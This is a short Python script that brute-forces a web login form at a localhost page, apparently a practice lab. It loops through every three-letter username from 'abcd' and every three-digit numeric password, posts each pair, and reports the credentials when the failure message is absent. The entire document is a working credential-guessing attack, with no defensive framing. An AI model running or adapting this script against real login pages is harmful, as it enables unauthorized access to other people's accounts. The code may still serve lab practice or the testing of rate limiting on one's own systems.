import requests
from termcolor import colored
from itertools import product

url = 'http://localhost/asbrute1/login3.php' #login page url
login_failed_string = 'Incorrect username or password.'
password_length = 3  #Setting the length of password
password_chars = '0123456789'  #combinations to try in the password

for username_chars in product('abcd', repeat=3): #trying all the possible combinations for the username
    username = ''.join(username_chars)
    print("Trying username:", username)

    password_generator = ((''.join(p)) for p in product(password_chars, repeat=password_length))  #to try all the combinations of password for the username selected

    found = False  #flag for finding the correct username and password
    for password in password_generator:
        data = {'username': username, 'password': password, 'login': 'submit'}
        response = requests.post(url, data=data)  #getting server response
        if login_failed_string in response.content.decode():
            print("Trying password:", password)
        else:
            print(colored(('Found Username: ==> ' + username), 'blue'))
            print(colored(('Found Password: ==> ' + password), 'blue'))
            found = True
            break
    if found:
        break
if not found:
    print('Username and Password Not Found')